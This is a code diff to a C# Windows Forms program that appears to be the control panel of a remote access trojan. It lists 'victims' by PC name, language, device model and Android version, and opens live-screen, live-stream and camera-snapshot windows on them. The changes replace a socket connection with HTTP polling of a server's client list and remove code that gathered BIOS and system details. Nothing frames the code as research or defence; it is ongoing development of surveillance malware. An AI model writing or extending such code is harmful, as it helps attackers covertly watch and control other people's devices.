@@ -7,9 +7,11 @@ using System.Drawing;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Net.Http;
 using System.Net.Sockets;
 using ListView = System.Windows.Forms.ListView;
 using System.Net;
+using Newtonsoft.Json.Linq;
 using System.Text;
 using System.Web.UI.WebControls;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement;
@@ -2050,9 +2052,9 @@ namespace Hiatme_Tool_Suite_v3
 
         public static Socket oursocket = default;
         private const string IP = "127.0.0.1";
-        //private const int PORT = 8443;
 
-        //client
+        public static HttpClient ServerHttpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
+        private System.Windows.Forms.Timer _clientListTimer;
 
 
         public async void Connect_Setup()
@@ -2061,33 +2063,17 @@ namespace Hiatme_Tool_Suite_v3
             {
                 try
                 {
-                    if (oursocket != null)
+                    if (_clientListTimer != null)
                     {
-                        oursocket.Close();
+                        _clientListTimer.Stop();
+                        _clientListTimer.Dispose();
+                        _clientListTimer = null;
                     }
-                    oursocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
-
-                    //Soketimiz.NoDelay = true;
-                    /////endpForMic = endpoint;
-                    //Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;
-
-                    oursocket.Connect(IPAddress.Loopback, port_no);
-
-                    var manufacturer = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS").GetValue("SystemManufacturer");
-                    var model = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS").GetValue("SystemProductName");
-
-
-                    MainValues.VICTIM_NAME = Environment.MachineName;
-                    sendToSocket("IP", "[VERI]" +
-                        MainValues.VICTIM_NAME + "[VERI]" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
-                       + "[VERI]" + manufacturer + "-" + model + "[VERI]" + Environment.OSVersion.ToString() + "[VERI][0x09]");
-
-
-
-                    SetSocketKeepAliveValues(oursocket, 2000, 1000);
-                    infoAl(oursocket);
-                    await Task.Delay(1000);
-                    RequestClientsList();
+                    await FetchClientsListOnce();
+                    _clientListTimer = new System.Windows.Forms.Timer();
+                    _clientListTimer.Interval = 4000;
+                    _clientListTimer.Tick += async (s, e) => await FetchClientsListOnce();
+                    _clientListTimer.Start();
                 }
                 catch (Exception ex)
                 {
@@ -2097,6 +2083,26 @@ namespace Hiatme_Tool_Suite_v3
                 }
             });
         }
+
+        private async Task FetchClientsListOnce()
+        {
+            try
+            {
+                var baseUrl = (MainValues.ServerApiBase ?? "http://localhost:3000").TrimEnd('/');
+                var response = await ServerHttpClient.GetAsync(baseUrl + "/api/clients");
+                response.EnsureSuccessStatusCode();
+                var json = await response.Content.ReadAsStringAsync();
+                var jo = JObject.Parse(json);
+                var clientsArray = jo["clients"]?.ToString() ?? "[]";
+                var arrstr = new[] { "RECCLIENTLIST", clientsArray };
+                Invoke((MethodInvoker)delegate { ModifyClientListCheck(arrstr); });
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Fetch clients: " + ex.Message);
+            }
+        }
+
         public async void infoAl(Socket sckInf)
         {
             try
@@ -2219,7 +2225,7 @@ namespace Hiatme_Tool_Suite_v3
 
                         StringBuilder sb = new StringBuilder();
 
-                        if (arrstr != null || arrstr.Length > 0)
+                        if (arrstr != null && arrstr.Length > 1)
                         {
                             List<Victim> victimlist = JsonConvert.DeserializeObject<List<Victim>>(arrstr[1]);
 
@@ -2247,8 +2253,7 @@ namespace Hiatme_Tool_Suite_v3
                                     }
                                     if (!clientfound)
                                     {
-                                        //list.Add(victimcopy);
-                                        Add_Client(oursocket, vic.id, vic.pcname, vic.language, vic.model, vic.version);
+                                        Add_Client(vic.soket ?? oursocket, vic.id, vic.pcname, vic.language, vic.model, vic.version);
                                         listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + vic.id);
                                     }
                                 }
@@ -2314,19 +2319,21 @@ namespace Hiatme_Tool_Suite_v3
 
                         Console.WriteLine(sb.ToString());
 
-                        List<Victim> newlist = new List<Victim>();
-                        foreach (Victim victim in victim_list)
+                        if (arrstr.Length > 2)
                         {
-                            for (int i = 1; i < arrstr.Length; i++)
+                            List<Victim> newlist = new List<Victim>();
+                            foreach (Victim victim in victim_list)
                             {
-                                if (victim.id == arrstr[i])
+                                for (int i = 1; i < arrstr.Length; i++)
                                 {
-                                    newlist.Add(victim);
+                                    if (victim.id == arrstr[i])
+                                    {
+                                        newlist.Add(victim);
+                                    }
                                 }
                             }
+                            victim_list = newlist;
                         }
-
-                        victim_list = newlist;
 
                             foreach (ListViewItem lvi in listView1.Items)
                             {
@@ -2387,7 +2394,7 @@ namespace Hiatme_Tool_Suite_v3
             victim_list.Add(new Victim(socket, victim_id, pc_name, country_language, manufacturer_model, android_ver));
             ListViewItem lvi = new ListViewItem(victim_id);
             lvi.SubItems.Add(pc_name);
-            lvi.SubItems.Add(socket.RemoteEndPoint.ToString());
+            lvi.SubItems.Add(socket != null ? socket.RemoteEndPoint?.ToString() : "-");
             lvi.SubItems.Add(country_language);
             lvi.SubItems.Add(manufacturer_model.ToUpper());
             lvi.SubItems.Add(android_ver);
@@ -2395,8 +2402,8 @@ namespace Hiatme_Tool_Suite_v3
             listView1.Items.Add(lvi);
 
             onlinecountlbl.Text = "Online: " + listView1.Items.Count.ToString();
-            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + socket.Handle.ToString() +
-                        " socket in list. => " + pc_name + "/" + socket.RemoteEndPoint.ToString());
+            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + (socket != null ? socket.Handle.ToString() : "-") +
+                        " in list. => " + pc_name + "/" + (socket?.RemoteEndPoint?.ToString() ?? "-"));
             await Task.Delay(1);
             topOf += 125;
 
@@ -2690,14 +2697,21 @@ namespace Hiatme_Tool_Suite_v3
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                if (int.Parse(listView1.SelectedItems[0].SubItems[5].Text.Split('/')[1]) >= 21)
+                bool apiLevelOk = true;
+                try
+                {
+                    var v = listView1.SelectedItems[0].SubItems[5].Text.Split('/');
+                    if (v.Length > 1) apiLevelOk = int.Parse(v[1]) >= 21;
+                }
+                catch { }
+                if (apiLevelOk)
                 {
                     foreach (Victim victim in victim_list)
                     {
                         if (victim.id == listView1.SelectedItems[0].Text)
                         {
-                            livescreen lvsc = new livescreen(oursocket, victim.id);
-                            lvsc.Text = "Live Screen - " + FindVictim(victim.id);
+                            livescreen lvsc = new livescreen(victim.id, victim.pcname ?? victim.id);
+                            lvsc.Text = "Live Screen - " + (victim.pcname ?? victim.id);
                             lvsc.Show();
                         }
                     }
@@ -2711,28 +2725,28 @@ namespace Hiatme_Tool_Suite_v3
         }
         private void liveStreamToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count == 1)
+            if (listView1.SelectedItems.Count != 1) return;
+            foreach (Victim victim in victim_list)
             {
-                foreach (Victim victim in victim_list)
+                if (victim.id == listView1.SelectedItems[0].Text)
                 {
-                    if (victim.id == listView1.SelectedItems[0].Text)
-                    {
-                        CommandSend("PrepareScreen", "[VERI][0x09]", oursocket); //prepare camera
-                    }
+                    var lvsc = new livescreen(victim.id, victim.pcname ?? victim.id);
+                    lvsc.Text = "Live Stream - " + (victim.pcname ?? victim.id);
+                    lvsc.Show();
+                    return;
                 }
             }
         }
         private void SnapPictureToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count == 1)
+            if (listView1.SelectedItems.Count != 1) return;
+            foreach (Victim victim in victim_list)
             {
-                foreach (Victim victim in victim_list)
+                if (victim.id == listView1.SelectedItems[0].Text)
                 {
-                    if (victim.id == listView1.SelectedItems[0].Text)
-                    {
-                        CommandSend("CAMHAZIRLA", "[VERI][0x09]", oursocket);
-                        Console.WriteLine("boo");
-                    }
+                    var kam = new Kamera(victim.id, victim.pcname ?? victim.id);
+                    kam.Show();
+                    return;
                 }
             }
         }
@@ -2751,13 +2765,13 @@ namespace Hiatme_Tool_Suite_v3
 
         private void listenswitch_CheckedChanged(object sender, EventArgs e)
         {
-            if(this.listenswitch.Checked == true)
-            {
+            if (listenswitch.Checked)
                 Connect_Setup();
-            }
             else
             {
-
+                _clientListTimer?.Stop();
+                _clientListTimer?.Dispose();
+                _clientListTimer = null;
             }
         }
 
